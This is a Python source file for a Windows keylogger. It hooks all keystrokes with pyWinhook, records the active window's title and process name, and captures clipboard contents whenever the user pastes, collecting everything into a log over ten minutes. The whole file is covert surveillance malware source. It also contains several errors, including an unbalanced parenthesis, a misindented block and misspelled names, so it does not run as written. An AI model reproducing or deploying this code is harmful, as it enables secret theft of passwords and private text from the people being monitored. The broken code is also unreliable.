from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.curent_window = None

    def get_current_process(self): # Captures the active window and process ID.
        hwnd = windll.user32.GetForegroundWindow() # Returns an handle to the active window on the desktop.
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # Retrieve the windows process ID.
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400)|0x10, False, pid) # Open the process.
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # Find the name of the process.
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # Get the full text of process title bar.
            try:
                self.current_window = window_title.value.decode()
            except UnicodeDecodeError as e:
                print(f'{e}:window name unknown')

            print('\n', process_id, executable.value.decode(), self.current_window) # Print all of the info.
            
            windll.kernel32.CloseHandle(hwnd)
            windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window: # Determine if the user has switched windows.
            self.get_current_process() # If switched Windows, get new window info.
        if 32 < event.Ascii < 127: # Check if the characters pressed are Ascii printable.
            print(chr(event.Ascii), end='') # Print characters if printable. If SHIFT, CTRL, ALT, etc., grab keyname from event object and print that.
        else:
            if event.Key == 'V': # If user is using paste operation, we dump the contents of the clipboard.
                wind32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO() # Temporary switch from stdout to a file-like object (StringIO), to query later.

    kl = KeyLogger() # Create the KeyLogger object.
    hm = pyHook.HookManager() # Define the PyWinHook HookManager.
    hm.KeyDown = kl.mykeystroke # Bind the KeyDown event to the KeyLogger callback method mykeystroke.
    hm.HookKeyboard() # Instruct PyWinHook to hook all keypresses.
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(run())
    print('done.')
